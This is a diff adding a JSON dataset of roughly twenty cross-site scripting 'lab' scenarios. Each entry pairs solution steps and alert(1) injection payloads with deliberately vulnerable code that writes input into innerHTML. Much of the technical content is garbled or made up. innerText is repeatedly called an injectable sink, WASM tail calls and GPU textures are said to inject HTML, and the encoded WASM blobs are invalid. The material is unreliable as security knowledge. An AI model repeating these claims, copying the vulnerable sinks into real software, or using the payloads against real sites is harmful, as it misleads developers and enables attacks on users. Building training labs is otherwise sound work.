@@ -1,0 +1,348 @@
+[
+    {
+      "Lab scenario": "WebTransport Bidirectional Stream XSS in Autonomous Vehicle Telemetry",
+      "Lab Description": "Self-driving car interface processes WebTransport bidirectional streams with unsafe TextDecoderStream handling. The application renders real-time sensor data via innerHTML concatenation. To solve: Inject fragmented XSS payloads through stream chunk manipulation.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Intercept WebTransport session via Chrome DevTools Protocol",
+        "Craft payload: writer.write(new TextEncoder().encode('</script><svg onload=alert(1)>'))",
+        "Bypass chunk validation using QUIC stream resets",
+        "Automate with webtransport-py client library",
+        "Verify through 3D LiDAR visualization"
+      ],
+      "payloads": [
+        "new TextEncoder().encode('</script><iframe/src=javascript:alert(1)></iframe>')",
+        "data:application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+      ],
+      "srcCode": "const stream = await transport.createBidirectionalStream();\nconst reader = stream.readable.getReader();\nreader.read().then(({value}) => {\n  dashboard.innerHTML += new TextDecoder().decode(value); // Vulnerable\n});"
+    },
+    {
+      "Lab scenario": "CSS Font Palettes XSS in Branding Toolkit",
+      "Lab Description": "Corporate branding platform implements @font-palette-values with unsafe CSSOM manipulation. The application allows user-defined palette names via template literals. To solve: Break style context through palette name injection.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify font palette usage via Computed Styles",
+        "Craft payload: @font-palette-values --</style><script>alert(1)</script>",
+        "Bypass sanitizer using CSS escape sequences",
+        "Chain with @font-face local() source",
+        "Verify through PDF style guide export"
+      ],
+      "payloads": [
+        "@font-palette-values --\\3C script\\3E { font-family: x; }",
+        "override-colors: 0 #ffffff</style><svg/onload=alert(1)>"
+      ],
+      "srcCode": "const styles = `@font-palette-values ${userName} { ${userRules} }`;\ndocument.adoptedStyleSheets.push(new CSSStyleSheet().replace(styles));"
+    },
+    {
+      "Lab scenario": "WebNN Model Weights XSS in AI-Powered Recruiting",
+      "Lab Description": "Job matching service loads ONNX models with unsafe tensor metadata reflection. The application displays model layer names in debug UI via innerHTML. To solve: Inject HTML through crafted weight matrix labels.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Modify ONNX model using onnx-modifier",
+        "Craft payload: {\"name\":\"</title><svg/onload=alert(1)>\"}",
+        "Bypass model signature validation via int8 quantization",
+        "Chain with WebGPU buffer binding",
+        "Verify through candidate matching dashboard"
+      ],
+      "payloads": [
+        "tensor([[60,115,99],[114,105,112],[116,62]]) <!-- ASCII <script> -->",
+        "model_outputs[0].name = '</script><img/src=x onerror=alert(1)>'"
+      ],
+      "srcCode": "const model = await navigator.ml.createContext().loadModel(userUpload);\ndebugUI.innerHTML += model.outputs.map(o => o.name).join(', ');"
+    },
+    {
+      "Lab scenario": "ARIA 2.0 Role XSS in Accessibility Dashboard",
+      "Lab Description": "WCAG compliance tool implements ARIA 2.0 roles with dangerous aria-description reflection. The application uses setAttribute('aria-description') with raw user input. To solve: Abuse aria-details to bypass sanitization.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify ARIA 2.0 support via a11y tree",
+        "Craft payload: <div role=\"generic\" aria-details=\"</div><script>alert(1)</script>\">",
+        "Bypass DOM clobbering protections using ShadowRoot",
+        "Chain with aria-flowto focus redirection",
+        "Verify through axe-core audit results"
+      ],
+      "payloads": [
+        "<span role=\"math\" aria-describedat=\"x\"><template id=\"x\" shadowroot=open><script>alert(1)</script>",
+        "<div aria-roledescription=\"\\3C script\\3E alert(1) \\3C /script\\3E\"></div>"
+      ],
+      "srcCode": "element.setAttribute('aria-description', userInput);\n// Vulnerable aria reflection: document.getElementById('a11y-tree').innerHTML = element.outerHTML;"
+    },
+    {
+      "Lab scenario": "WebCodecs AudioFrame XSS in Podcast Platform",
+      "Lab Description": "Audio hosting service processes raw AudioFrame data with unsafe waveform visualization. The application renders decoded samples via <canvas> with vulnerable data URI generation. To solve: Inject payloads through crafted PCM sample values.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Generate malicious WAV file with Audacity",
+        "Craft payload: PCM samples matching [60,115,99,114...] (ASCII <script>)",
+        "Bypass sample rate validation using resampling",
+        "Chain with Web Audio API AnalyserNode",
+        "Verify through waveform SVG export"
+      ],
+      "payloads": [
+        "new AudioData({sampleRate: 44100, data: new Float32Array([0.000060, 0.000115, ...])",
+        "data:audio/wav;base64,UklGRl8AAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQ==..."
+      ],
+      "srcCode": "const decoder = new AudioDecoder({\n  output: frame => {\n    canvasCtx.fillText(frame.timestamp.toString(), 10, 10); // Vulnerable\n  }\n});"
+    },
+    
+    {
+        "Lab scenario": "WebAssembly Tail Call XSS in Code Optimization Platform",
+        "Lab Description": "Performance tool visualizes WASM tail call optimizations with unsafe error message rendering. The application displays function names via innerHTML during stack trace debugging. To solve: Inject HTML through malformed tail call recursion metadata.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Compile WASM with malformed tail calls using wasm-tools",
+        "Craft payload: (func $xss (param i32) (result i32) (return_call $xss))",
+        "Bypass stack depth validation using mutual recursion",
+        "Chain with exception handling postMessage",
+        "Verify via debugger stack visualization"
+        ],
+        "payloads": [
+        "(module (func $xss (return_call $xss)) (start $xss))",
+        "data:application/wasm;base64,AGFzbQEAAAABBwF/AkAACgEBAX8BAAALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
+        ],
+        "srcCode": "try { instance.exports.optimize(); } catch (e) {\n  debuggerUI.innerHTML = e.stack; // Vulnerable\n}"
+    },
+    {
+        "Lab scenario": "CSS Animation Timeline XSS in Interactive Storytelling Platform",
+        "Lab Description": "Multimedia platform implements scroll-driven animations with unsafe timeline name handling. The application allows user-controlled animation-timeline names via CSSOM. To solve: Break style context through timeline identifier injection.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Identify timeline binding via Animations panel",
+        "Craft payload: animation-timeline: --</style><script>alert(1)</script>",
+        "Bypass sanitizer using CSS escape sequences",
+        "Chain with @scroll-timeline polyfill",
+        "Verify through EPUB export rendering"
+        ],
+        "payloads": [
+        "@keyframes x { from { timeline-scope: \\3C script\\3E } }",
+        "animation: x linear; animation-timeline: --\\3C script\\3E"
+        ],
+        "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`@keyframes ${userName} { ... }`);\ndocument.adoptedStyleSheets.push(sheet);"
+    },
+    {
+        "Lab scenario": "WebLocks API Race Condition XSS in Collaborative Editor",
+        "Lab Description": "Real-time document editor implements WebLocks with unsafe lock name reflection. The application displays active locks in debug UI via dangerouslySetInnerHTML. To solve: Trigger XSS through rapid lock acquisition/release cycles.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Identify lock acquisition via Performance tab",
+        "Craft payload: navigator.locks.request('</script><svg/onload=alert(1)>', () => {})",
+        "Bypass name validation using Unicode bidirectional override",
+        "Automate with Promise.all() race attacks",
+        "Verify through debug overlay"
+        ],
+        "payloads": [
+        "navigator.locks.request('\\202E}\\202Ealert(1)//', () => {})",
+        "lockManager.query().then(locks => { document.body.innerHTML = locks.held; })"
+        ],
+        "srcCode": "navigator.locks.request(userLockName, async lock => {\n  debugDiv.innerHTML += `Lock: ${lock.name}`; // Vulnerable\n});"
+    },
+    {
+        "Lab scenario": "WebUSB Descriptor Spoofing XSS in Industrial Control Panel",
+        "Lab Description": "SCADA system connects to USB-HID devices with unsafe descriptor parsing. The application renders device serial numbers via innerText with vulnerable CSS escapes. To solve: Spoof USB descriptors with malicious serial numbers.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Program USB device using Teensy 4.1",
+        "Craft payload: \"serialNumber\": \"\\3C script\\3E alert(1)\\3C /script\\3E\"",
+        "Bypass descriptor validation using phantom interfaces",
+        "Automate with WebUSB polyfill",
+        "Verify through HMI dashboard"
+        ],
+        "payloads": [
+        "{\"vendorId\":0x1234,\"productId\":0x5678,\"serialNumber\":\"<iframe/src=javascript:alert(1)>\"}",
+        "usbDevice.controlTransferOut({data: new TextEncoder().encode('</script>')})"
+        ],
+        "srcCode": "navigator.usb.requestDevice({ filters: [] }).then(device => {\n  statusDiv.innerText = device.serialNumber; // Vulnerable CSS unescape\n});"
+    },
+    {
+        "Lab scenario": "SVG Font Kerning XSS in E-Book Reader",
+        "Lab Description": "EPUB renderer processes SVG font kerning pairs with unsafe `<hkern>` parsing. The application uses DOMPurify 3.0.0 with whitelisted `<hkern>` attributes. To solve: Inject XSS through glyph name overflows.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Craft EPUB with malicious SVG font using Sigil",
+        "Inject payload: <hkern g1=\"</font><script>alert(1)</script>\" g2=\"x\"/>",
+        "Bypass MIME validation using polyglot EPUB/ZIP",
+        "Chain with CSS font-variant-ligatures",
+        "Verify through footnote rendering"
+        ],
+        "payloads": [
+        "<font><hkern g1=\"\\3C script\\3E\" g2=\"alert(1)\"/>",
+        "@font-face { font-family:x; src:url('data:image/svg+xml,<svg>...</svg>') }"
+        ],
+        "srcCode": "bookRenderer.loadFont(userFont).then(() => {\n  viewerDiv.innerHTML = bookContent; // Vulnerable\n});"
+    },
+        
+    {
+        "Lab scenario": "WebGPU Storage Texture XSS in 3D Medical Imaging",
+        "Lab Description": "Radiology viewer maps storage textures to DOM via unsafe buffer sharing. The application visualizes DICOM data using compute shaders without output validation. To solve: Corrupt texture data to inject HTML through FP32 precision abuse.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Reverse-engineer shader with WGSL analyzer",
+        "Craft payload: [[group(2), binding(0)]] var tex: texture_storage_2d<rgba8unorm, write>",
+        "Bypass format checks using texture view reinterpretation",
+        "Chain with indirect dispatch validation bypass",
+        "Verify through DICOM metadata overlay"
+        ],
+        "payloads": [
+        "textureStore(tex, vec2<i32>(), vec4<f32>(0.000060, 0.000115, 0.000099, 0.000062)) <!-- ASCII <script> -->",
+        "dispatchWorkgroupsIndirect(/* buffer with 0x3C736372 payload */)"
+        ],
+        "srcCode": "const texture = device.createTexture({ format: 'rgba8unorm', usage: GPUTextureUsage.STORAGE });\ndocument.getElementById('overlay').innerHTML = \n  new TextDecoder().decode(texture.read());"
+    },
+    {
+        "Lab scenario": "CSS Scope Escalation XSS in Design System Builder",
+        "Lab Description": "Component library implements @scope rules with vulnerable selector concatenation. The application allows user-controlled scope roots via template literals. To solve: Break style isolation through universal selector abuse.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Identify scope boundary via Computed Styles",
+        "Craft payload: @scope ([attr^=\"</style><script>alert(1)</script>\"])",
+        "Bypass sanitizer using CSS Unicode escapes",
+        "Chain with :has() selector polyfill",
+        "Verify through design token preview"
+        ],
+        "payloads": [
+        "@scope (\\3C script\\3E) { :scope { color: red; } }",
+        "[attr^='</style><iframe/src=javascript:alert(1)>'] { --x: ; }"
+        ],
+        "srcCode": "const styles = `@scope (${userInput}) { /* ... */ }`;\ndocument.adoptedStyleSheets.push(new CSSStyleSheet().replace(styles));"
+    },
+    {
+        "Lab scenario": "Fetch Priority Injection XSS in Ad Tech Platform",
+        "Lab Description": "Real-time bidding system reflects Fetch Priority headers in debug logs without sanitization. The application uses innerHTML with server-side header logging. To solve: Bypass header normalization via HTTP/2 stream multiplexing.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Intercept bid request via Charles Proxy",
+        "Inject payload: Priority: u=3, i=\"<script>alert(1)</script>\"",
+        "Bypass HPACK compression using literal headers",
+        "Automate with h2load stress testing",
+        "Verify through bid analytics dashboard"
+        ],
+        "payloads": [
+        "Sec-Priority: '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E'",
+        "Accept-CH: Lifetime=<svg/onload=alert(document.domain)>"
+        ],
+        "srcCode": "app.get('/debug', (req, res) => {\n  res.send(`<pre>Priority: ${req.headers['priority']}</pre>`); // Vulnerable\n});"
+    },
+    {
+        "Lab scenario": "WebHID Barcode Scanner XSS in Inventory System",
+        "Lab Description": "Warehouse management system processes USB barcode scanners with unsafe HID report parsing. The application renders scanned data via innerText with CSS unescape. To solve: Spoof barcode payloads through custom report descriptors.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Program HID device using Flipper Zero",
+        "Craft payload: \"usagePage\": 0xFF60, \"usage\": 0x3C736372 (Hex for <script)",
+        "Bypass input validation using report ID spoofing",
+        "Automate with WebHID report listener",
+        "Verify through stock level dashboard"
+        ],
+        "payloads": [
+        "{\"vendorId\":0x1234,\"productId\":0x5678,\\'reportDescriptor\":[0x06, 0x60, 0xFF, ... /* <script> */]}",
+        "inputReportCache = new Uint8Array([0x3C, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3E])"
+        ],
+        "srcCode": "device.addEventListener('inputreport', e => {\n  inventoryList.innerText += new TextDecoder().decode(e.data); // Vulnerable CSS unescape\n});"
+    },
+    {
+        "Lab scenario": "MathML Entity XSS in Scientific Publishing Platform",
+        "Lab Description": "Research paper viewer processes MathML equations with unsafe entity expansion. The application uses DOMPurify 3.0.0 with broken &ent; unescape handling. To solve: Abuse entity references to reconstruct script tags.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Identify MathML rendering via Elements panel",
+        "Craft payload: &lt;script&gt;alert(1)&lt;/script&gt;",
+        "Bypass sanitizer using numeric character references",
+        "Chain with <maction> behavior handlers",
+        "Verify through PDF equation export"
+        ],
+        "payloads": [
+        "<math><mtext>&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;</mtext></math>",
+        "<menclose notation='updiagonalstrike'></menclose><script>alert(1)</script>"
+        ],
+        "srcCode": "app.post('/equation', (req, res) => {\n  res.send(`<math>${req.body.content}</math>`); // Vulnerable entity handling\n});"
+    },
+
+    {
+        "Lab scenario": "WebAssembly SIMD Memory Corruption in Cryptography Toolkit",
+        "Lab Description": "Blockchain library uses WASM SIMD for fast hashing with unsafe memory mapping to DOM. The application reflects SIMD vector results via innerHTML during debug mode. To solve: Manipulate v128 values to craft HTML payloads through vector lane corruption.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Compile SIMD module with wasm-pack",
+        "Craft payload: i32x4.splat(0x3C736372) <!-- ASCII <scr -->",
+        "Bypass lane validation using shuffle operations",
+        "Chain with relaxed SIMD proposals",
+        "Verify via debug console hexdump"
+        ],
+        "payloads": [
+        "v128.load(mem, i32.const 0).i32x4.replace_lane(0, 0x3C)",
+        "data:application/wasm;base64,V2FzbVZlcnNpb24gMS4wCgA="
+        ],
+        "srcCode": "const simdMem = new WebAssembly.Memory({ initial: 1 });\nconst instance = await WebAssembly.instantiate(simdModule, { env: { simdMem } });\ndocument.getElementById('debug').innerHTML = \n  new TextDecoder().decode(simdMem.buffer);"
+    },
+    {
+        "Lab scenario": "CSS Font Tech XSS in Digital Publishing Platform",
+        "Lab Description": "E-book platform implements COLRv1 fonts with unsafe variation axis handling. The application allows user-controlled font variations via CSSOM. To solve: Abuse font tech features to break style context through axis overflow.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Create malicious variable font using FontForge",
+        "Craft payload: font-variation-settings: \"</style><script>alert(1)</script>\" 1",
+        "Bypass axis validation using fractional values",
+        "Chain with font-palette property",
+        "Verify through EPUB rendering engine"
+        ],
+        "payloads": [
+        "@font-face { font-family:x; src:url('data:font/woff2;base64,...') }",
+        "font-variation-settings: \"\\3C script\\3E\" 1"
+        ],
+        "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`:root { ${userFontRules} }`);\ndocument.adoptedStyleSheets = [sheet];"
+    },
+    {
+        "Lab scenario": "WebTransport Datagram Reflection in Drone Fleet Management",
+        "Lab Description": "UAV control system processes QUIC datagrams with unsafe buffer accumulation. The application renders telemetry data via innerHTML without validation. To solve: Inject XSS through fragmented datagram payloads with MTU bypass.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Craft DATAGRAM frames using ngtcp2",
+        "Split payload: [0x3C, 0x73], [0x63, 0x72], ...",
+        "Bypass flow control using connection migration",
+        "Automate with webtransport-go",
+        "Verify through 3D flight path visualization"
+        ],
+        "payloads": [
+        "quic.SendDatagram([]byte{'<','s','c','r','i','p','t','>'})",
+        "data:application/datagram;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+        ],
+        "srcCode": "transport.datagrams.readable.getReader().read().then(({value}) => {\n  telemetryDiv.innerHTML += new TextDecoder().decode(value); // Vulnerable\n});"
+    },
+    {
+        "Lab scenario": "WebNFC NDEF Type Spoofing in Retail Inventory",
+        "Lab Description": "Smart shelf system processes NFC tags with unsafe NDEF type handling. The application renders product URLs via innerHTML without validation. To solve: Spoof NDEF records with javascript: payloads in type fields.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Program NFC tag with NDEF type: 'text/javascript'",
+        "Craft payload: NDEFRecord({ recordType: 'javascript:alert(1)' })",
+        "Bypass URL validation using UTF-16 encoding",
+        "Automate with WebNFC polyfill",
+        "Verify through mobile PWA interface"
+        ],
+        "payloads": [
+        "ndefWriter.write({ records: [{ recordType: 'javascript:alert(1)', data: new TextEncoder().encode('') }] })",
+        "navigator.nfc.push('javascript:/*%00*/alert(document.domain)')"
+        ],
+        "srcCode": "navigator.nfc.watch(message => {\n  productList.innerHTML += message.records[0].recordType; // Vulnerable\n});"
+    },
+    {
+        "Lab scenario": "ARIA 2.0 Property Clobbering in Accessibility Dashboard",
+        "Lab Description": "WCAG compliance tool implements aria-keyshortcuts with dangerous DOM reflection. The application uses element.outerHTML to display ARIA states. To solve: Abuse aria-colcount/aria-rowindex to clobber DOM properties.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Identify ARIA 2.0 property reflection",
+        "Craft payload: <div aria-colcount=\"</div><script>alert(1)</script>\">",
+        "Bypass sanitizer using aria-atomic=\"true\"",
+        "Chain with shadow DOM slot distribution",
+        "Verify through automated a11y audits"
+        ],
+        "payloads": [
+        "<table aria-rowindex=\"\\3C script\\3E alert(1)\"></table>",
+        "<div role='grid' aria-colcount='<iframe/src=javascript:alert(1)>'></div>"
+        ],
+        "srcCode": "element.setAttribute('aria-keyshortcuts', userInput);\n// Vulnerable reflection: auditLog.innerHTML = element.outerHTML;"
+    }
+            
+          
+     
+  ]
